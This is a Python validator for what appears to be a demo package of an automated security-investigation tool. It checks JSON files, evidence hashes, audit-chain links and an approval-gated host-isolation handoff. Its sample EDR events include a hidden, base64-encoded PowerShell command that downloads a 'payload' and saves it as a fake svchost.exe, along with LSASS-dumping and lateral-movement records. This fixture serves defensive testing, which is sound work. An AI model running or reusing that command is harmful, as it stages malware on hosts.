#!/usr/bin/env python3
"""
validate_yc_demo.py — Validate the Zovark YC demo proof package.

Checks:
  1. All JSON files parse.
  2. Evidence hashes recomputed and match evidence-ledger.json.
  3. Audit chain linkage (entry2.prev == entry1.this).
  4. replay-report.json assertions.
  5. edr-handoff.json assertions.

Usage:
    python scripts/validate_yc_demo.py

Run from the repo root. Exits 0 on success, 1 on any failure.
"""

from __future__ import annotations

import hashlib
import json
import sys
from pathlib import Path
from typing import Any

REPO_ROOT = Path(__file__).parent.parent
OUT_DIR = REPO_ROOT / "demo" / "zovark-proof-package" / "out" / "tape-001"
SAMPLES_DIR = REPO_ROOT / "demo" / "zovark-proof-package" / "samples" / "edr"

FAILURES: list[str] = []


def fail(msg: str) -> None:
    FAILURES.append(msg)
    print(f"  FAIL: {msg}")


def ok(msg: str) -> None:
    print(f"  OK:   {msg}")


# ---------------------------------------------------------------------------
# Canonical JSON (must match generate_yc_demo.py exactly)
# ---------------------------------------------------------------------------

def canonical_json(obj: Any) -> bytes:
    return _serialize(obj).encode("utf-8")


def _serialize(obj: Any) -> str:
    if obj is None:
        return "null"
    if isinstance(obj, bool):
        return "true" if obj else "false"
    if isinstance(obj, int):
        return str(obj)
    if isinstance(obj, float):
        return json.dumps(obj)
    if isinstance(obj, str):
        return json.dumps(obj, ensure_ascii=False)
    if isinstance(obj, (list, tuple)):
        return "[" + ",".join(_serialize(i) for i in obj) + "]"
    if isinstance(obj, dict):
        pairs = ",".join(
            json.dumps(k, ensure_ascii=False) + ":" + _serialize(v)
            for k, v in sorted(obj.items())
        )
        return "{" + pairs + "}"
    raise TypeError(f"Unsupported type: {type(obj).__name__!r}")


def sha256_hex(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def sha256_of_obj(obj: Any) -> str:
    return sha256_hex(canonical_json(obj))


# ---------------------------------------------------------------------------
# Source objects (must match generate_yc_demo.py exactly)
# ---------------------------------------------------------------------------

ALERT_OBJ = {
    "alert_id": "alert-20260502-001",
    "alert_type": "edr_alert",
    "child_process": "powershell.exe",
    "description": "Suspicious child process spawned by Office application",
    "host": "HOST-12",
    "host_fqdn": "HOST-12.corp.example",
    "severity": "high",
    "source_process": "winword.exe",
    "timestamp": "2026-05-02T09:14:00Z",
}

PE_001 = {
    "event_id": "pe-001",
    "event_type": "process_event",
    "parent_pid": 3104,
    "parent_process": "winword.exe",
    "pid": 7832,
    "process_name": "powershell.exe",
    "command_line": (
        "powershell.exe -WindowStyle Hidden -EncodedCommand "
        "JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBX"
        "AGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgA"
        "JwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAwADAALwBwAGEAeQBs"
        "AG8AYQBkACcALAAnAEMAOgBcAFQAZQBtAHAAXABzAHYAYwBoAG8AcwB0AC4AZQB4AGUA"
        "JwApAA=="
    ),
    "timestamp": "2026-05-02T09:14:03Z",
    "user": "CORP\\jsmith",
}

NE_001 = {
    "bytes_received": 98304,
    "bytes_sent": 1842,
    "classification": "external_c2_candidate",
    "destination_ip": "192.168.1.100",
    "destination_port": 443,
    "event_id": "ne-001",
    "event_type": "network_event",
    "pid": 7832,
    "process": "powershell.exe",
    "protocol": "HTTPS",
    "source_host": "HOST-12",
    "timestamp": "2026-05-02T09:14:07Z",
}

CA_001 = {
    "event_id": "ca-001",
    "event_type": "credential_access",
    "host": "HOST-12",
    "pid": 7832,
    "process": "powershell.exe",
    "target_process": "lsass.exe",
    "technique": "T1003.001",
    "technique_name": "OS Credential Dumping: LSASS Memory",
    "timestamp": "2026-05-02T09:14:11Z",
}

LM_001 = {
    "destination_host": "HOST-13",
    "destination_ip": "10.0.1.13",
    "event_id": "lm-001",
    "event_type": "lateral_movement_attempt",
    "pid": 7832,
    "process": "powershell.exe",
    "source_host": "HOST-12",
    "status": "blocked_by_firewall",
    "technique": "T1021.002",
    "technique_name": "Remote Services: SMB/Windows Admin Shares",
    "timestamp": "2026-05-02T09:14:19Z",
}

SOURCE_OBJECTS = [
    ("edr_alert", ALERT_OBJ),
    ("process_event", PE_001),
    ("network_event", NE_001),
    ("credential_access", CA_001),
    ("lateral_movement_attempt", LM_001),
]


# ---------------------------------------------------------------------------
# Check 1 — All JSON files parse
# ---------------------------------------------------------------------------

JSON_FILES = [
    OUT_DIR / "evidence-ledger.json",
    OUT_DIR / "findings.json",
    OUT_DIR / "verdict.json",
    OUT_DIR / "timeline.json",
    OUT_DIR / "edr-handoff.json",
    OUT_DIR / "replay-report.json",
    OUT_DIR / "investigation-tape.json",
    SAMPLES_DIR / "phishing-powershell.json",
]


def check_json_parse() -> dict[str, Any]:
    print("\n[1] JSON parse check")
    loaded: dict[str, Any] = {}
    for path in JSON_FILES:
        if not path.exists():
            fail(f"{path.name} does not exist")
            continue
        try:
            data = json.loads(path.read_text(encoding="utf-8"))
            loaded[path.name] = data
            ok(f"{path.name} parses")
        except json.JSONDecodeError as e:
            fail(f"{path.name} is not valid JSON: {e}")
    return loaded


# ---------------------------------------------------------------------------
# Check 2 — Evidence hashes
# ---------------------------------------------------------------------------

def check_evidence_hashes(loaded: dict[str, Any]) -> None:
    print("\n[2] Evidence hash recomputation")
    ledger = loaded.get("evidence-ledger.json")
    if not ledger:
        fail("evidence-ledger.json not loaded; skipping hash check")
        return

    if len(ledger) != len(SOURCE_OBJECTS):
        fail(f"Expected {len(SOURCE_OBJECTS)} evidence entries, got {len(ledger)}")
        return

    for i, (entry, (source_type, obj)) in enumerate(zip(ledger, SOURCE_OBJECTS)):
        expected_hash = sha256_of_obj(obj)
        stored_hash = entry.get("hash", "")
        if stored_hash == expected_hash:
            ok(f"entry[{i}] ({source_type}) hash matches")
        else:
            fail(
                f"entry[{i}] ({source_type}) hash mismatch\n"
                f"    stored:   {stored_hash}\n"
                f"    expected: {expected_hash}"
            )

        # Also verify evidence_id derivation
        inner = sha256_of_obj(obj)
        expected_ev_id = "ev-" + sha256_hex((source_type + ":" + inner).encode("utf-8"))
        stored_ev_id = entry.get("evidence_id", "")
        if stored_ev_id == expected_ev_id:
            ok(f"entry[{i}] ({source_type}) evidence_id matches")
        else:
            fail(
                f"entry[{i}] ({source_type}) evidence_id mismatch\n"
                f"    stored:   {stored_ev_id}\n"
                f"    expected: {expected_ev_id}"
            )


# ---------------------------------------------------------------------------
# Check 3 — Audit chain linkage
# ---------------------------------------------------------------------------

def check_audit_chain(loaded: dict[str, Any]) -> None:
    print("\n[3] Audit chain linkage")
    replay = loaded.get("replay-report.json")
    if not replay:
        fail("replay-report.json not loaded; skipping audit chain check")
        return

    ace = replay.get("audit_chain_entry", {})
    entry2_prev = ace.get("prev_entry_hash", "")
    entry2_this = ace.get("this_entry_hash", "")

    # Recompute entry1 this_entry_hash from investigation-tape.json
    tape = loaded.get("investigation-tape.json")
    if not tape:
        fail("investigation-tape.json not loaded; skipping audit chain check")
        return

    # Reconstruct the tape snapshot used for fields_hash
    ledger_for_snapshot = [
        {"evidence_id": e["evidence_id"], "hash": e["hash"],
         "ingested_at": e["ingested_at"], "source_type": e["source_type"]}
        for e in tape.get("raw_evidence", [])
    ]
    tape_snapshot = {
        "findings": tape.get("findings", []),
        "raw_evidence": ledger_for_snapshot,
        "schema_version": tape.get("schema_version", ""),
        "source_alert_ref": tape.get("source_alert_ref", ""),
        "tape_id": tape.get("tape_id", ""),
        "tenant_id": tape.get("tenant_id", ""),
        "verdict_value": tape.get("verdict", {}).get("value", ""),
    }
    fields_hash = sha256_of_obj(tape_snapshot)
    genesis_hash = sha256_hex(b"genesis")

    entry1 = {
        "created_at": "2026-05-02T09:14:25Z",
        "entry_id": "audit-entry-1",
        "event_type": "tape_recording_closed",
        "payload": {
            "fields_hash": fields_hash,
            "tape_id": tape.get("tape_id", ""),
            "verdict_value": tape.get("verdict", {}).get("value", ""),
        },
        "prev_entry_hash": genesis_hash,
        "sequence": 1,
        "signed_root": None,
        "tenant_id": tape.get("tenant_id", ""),
        "this_entry_hash": "",
    }
    expected_entry1_this = sha256_of_obj(entry1)

    if entry2_prev == expected_entry1_this:
        ok(f"audit chain linkage: entry2.prev_entry_hash == entry1.this_entry_hash")
    else:
        fail(
            f"audit chain linkage broken\n"
            f"    entry2.prev_entry_hash: {entry2_prev}\n"
            f"    expected entry1.this:   {expected_entry1_this}"
        )

    # Verify entry2 this_entry_hash
    entry2 = {
        "created_at": "2026-05-02T09:14:26Z",
        "entry_id": "audit-entry-2",
        "event_type": "tape_replayed",
        "payload": ace.get("payload", {}),
        "prev_entry_hash": entry2_prev,
        "sequence": 2,
        "signed_root": None,
        "tenant_id": ace.get("tenant_id", ""),
        "this_entry_hash": "",
    }
    expected_entry2_this = sha256_of_obj(entry2)
    if entry2_this == expected_entry2_this:
        ok("entry2.this_entry_hash is correct")
    else:
        fail(
            f"entry2.this_entry_hash mismatch\n"
            f"    stored:   {entry2_this}\n"
            f"    expected: {expected_entry2_this}"
        )


# ---------------------------------------------------------------------------
# Check 4 — replay-report.json assertions
# ---------------------------------------------------------------------------

def check_replay_report(loaded: dict[str, Any]) -> None:
    print("\n[4] replay-report.json assertions")
    replay = loaded.get("replay-report.json")
    if not replay:
        fail("replay-report.json not loaded")
        return

    rs = replay.get("replay_state", {})

    def assert_field(obj: dict, key: str, expected: Any, label: str) -> None:
        actual = obj.get(key)
        if actual == expected:
            ok(f"{label}: {key} = {expected!r}")
        else:
            fail(f"{label}: {key} expected {expected!r}, got {actual!r}")

    assert_field(rs, "evidence_hashes_verified", True, "replay_state")
    assert_field(rs, "verdict_recomputed", True, "replay_state")
    assert_field(rs, "verdict_match", True, "replay_state")
    assert_field(rs, "no_live_llm_call", True, "replay_state")
    assert_field(rs, "no_live_edr_call", True, "replay_state")
    assert_field(rs, "state", "succeeded", "replay_state")
    assert_field(rs, "replay_status", "succeeded", "replay_state")
    assert_field(rs, "mode", "recorded_output", "replay_state")


# ---------------------------------------------------------------------------
# Check 5 — edr-handoff.json assertions
# ---------------------------------------------------------------------------

def check_handoff(loaded: dict[str, Any]) -> None:
    print("\n[5] edr-handoff.json assertions")
    handoff = loaded.get("edr-handoff.json")
    if not handoff:
        fail("edr-handoff.json not loaded")
        return

    def assert_field(obj: dict, key: str, expected: Any, label: str = "") -> None:
        actual = obj.get(key)
        if actual == expected:
            ok(f"{label or key}: {key} = {expected!r}")
        else:
            fail(f"{label or key}: {key} expected {expected!r}, got {actual!r}")

    assert_field(handoff, "action_type", "isolate_host")
    assert_field(handoff, "approval_mode", "approval_required")
    assert_field(handoff, "authorization_record_ref", "vault://placeholder/bootstrap")

    target = handoff.get("target", {})
    if target.get("identifier") == "HOST-12":
        ok("target.identifier = 'HOST-12'")
    else:
        fail(f"target.identifier expected 'HOST-12', got {target.get('identifier')!r}")

    er = handoff.get("execution_result", {})
    assert_field(er, "status", "pending", "execution_result")
    assert_field(er, "reason", "recommendation_only_no_dispatcher_in_slice_001", "execution_result")

    ev_refs = handoff.get("evidence_refs", [])
    if len(ev_refs) == 5:
        ok(f"evidence_refs has 5 entries")
    else:
        fail(f"evidence_refs expected 5 entries, got {len(ev_refs)}")

    blast = handoff.get("blast_radius")
    if blast:
        ok("blast_radius field present")
    else:
        fail("blast_radius field missing")

    rev = handoff.get("reversal_or_recovery_plan")
    if rev:
        ok("reversal_or_recovery_plan field present")
        if rev.get("reversibility_class") == "reversible_by_edr":
            ok("reversibility_class = 'reversible_by_edr'")
        else:
            fail(f"reversibility_class expected 'reversible_by_edr', got {rev.get('reversibility_class')!r}")
    else:
        fail("reversal_or_recovery_plan field missing")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> None:
    print("Validating Zovark YC demo proof package...")

    loaded = check_json_parse()
    check_evidence_hashes(loaded)
    check_audit_chain(loaded)
    check_replay_report(loaded)
    check_handoff(loaded)

    print()
    if FAILURES:
        print(f"VALIDATION FAILED — {len(FAILURES)} failure(s):")
        for f in FAILURES:
            print(f"  • {f}")
        sys.exit(1)
    else:
        print("VALIDATION PASSED — all checks OK.")
        sys.exit(0)


if __name__ == "__main__":
    main()
